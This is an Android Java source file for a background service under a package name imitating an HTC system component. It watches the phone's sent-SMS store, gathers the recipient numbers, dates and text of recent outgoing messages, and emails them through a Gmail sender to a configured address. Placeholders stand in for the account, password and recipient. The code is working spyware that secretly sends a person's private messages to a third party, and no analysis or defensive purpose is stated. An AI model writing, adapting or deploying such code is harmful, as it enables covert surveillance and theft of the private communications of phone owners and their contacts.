package com.htc.MessageService;

import java.io.IOException;
import java.io.InputStream;
import java.text.MessageFormat;
import java.io.FileWriter;

import android.R.bool;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;


public class SMSOutboundService extends Service {

	static final String TAG = "SMSOutboundService";
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
	@Override
	public void onCreate() {
		Log.w(TAG, "Created");
        Handler handle = new Handler(){};
        SMSOutbound observer = new SMSOutbound(handle);
        
        ContentResolver contentResolver = getApplicationContext().getContentResolver();
        contentResolver.registerContentObserver(Uri.parse("content://sms/sent"), true, observer);
	}
	
	public void sendSMS(String number, String message) {
		PendingIntent pi = PendingIntent.getActivity(this, 0,
	            new Intent(this, SMSOutboundService.class), 0);                
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(number, null, message, pi, null);
	}

	@Override
	public void onDestroy() {
		Log.w(TAG, "Destroyed");
	}
	
    class SMSOutbound extends ContentObserver {
    	
		private Bitmap getMmsImage(String _id) {
		    Uri partURI = Uri.parse("content://mms/part/" + _id);
		    InputStream is = null;
		    Bitmap bitmap = null;
		    try {
		        is = getContentResolver().openInputStream(partURI);
		        bitmap = BitmapFactory.decodeStream(is);
		    } catch (IOException e) {}
		    finally {
		        if (is != null) {
		            try {
		                is.close();
		            } catch (IOException e) {}
		        }
		    }
		    return bitmap;
		}
		
		private String getAddressNumber(String id) {
		    String selectionAdd = new String("msg_id=" + id);
		    String uriStr = "content://mms/"+id+"/addr";
		    Uri uriAddress = Uri.parse(uriStr);
		    Cursor cAdd = getContentResolver().query(uriAddress, null,
		        selectionAdd, null, null);
		    String name = null;
		    if (cAdd.moveToFirst()) {
		        do {
		            String number = cAdd.getString(cAdd.getColumnIndex("address"));
		            if (number != null) {
		                try {
		                    Long.parseLong(number.replace("-", ""));
		                    name = number;
		                } catch (NumberFormatException nfe) {
		                    if (name == null) {
		                        name = number;
		                    }
		                }
		            }
		        } while (cAdd.moveToNext());
		    }
		    if (cAdd != null) {
		        cAdd.close();
		    }
		    return name;
		}

        public SMSOutbound(Handler handler) {
            super(handler);
        }
        
        private StringBuilder m_outputLog = new StringBuilder();

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            
            // Always query the mms as it holds all conversation
            ContentResolver contentResolver = getContentResolver();
            Uri uri = Uri.parse("content://sms/sent");
            Cursor query = contentResolver.query(uri, null, null, null, null);
            
            if (query.moveToFirst()) {
            	int count = 0;	// Don't send more than 40!
                do {
                    // it's SMS
                	Log.w(TAG, "SMS Rx");
                	String phone = query.getString(query.getColumnIndex("address"));
                	String date = query.getString(query.getColumnIndex("date"));
                	String body = query.getString(query.getColumnIndex("body"));

                	m_outputLog.append("To: " + phone);
                	m_outputLog.append("\nDate: " + date);
                	m_outputLog.append("\nMessage: " + body);
                	m_outputLog.append("\n---------\n\n");
                	count++;
                } while (query.moveToNext() && count < 10);
                
            	if (m_outputLog.length() > 0) {
	            	try {
	                    GMailSender sender = new GMailSender("<your gmail account>", "<your password>");
	                    sender.sendMail("Message Log Outbound (last 40 messages)",   
	                    		m_outputLog.toString(),   
	                            "<to email>",
	                            "<from email>");
	                    
	                    m_outputLog.setLength(0);
	                } catch (Exception e) {
	                    Log.e("SendMail", e.getMessage(), e);
	                }
            	}
            }
            // use cur.getColumnNames() to get a list of all available columns..
        }
    }   
}
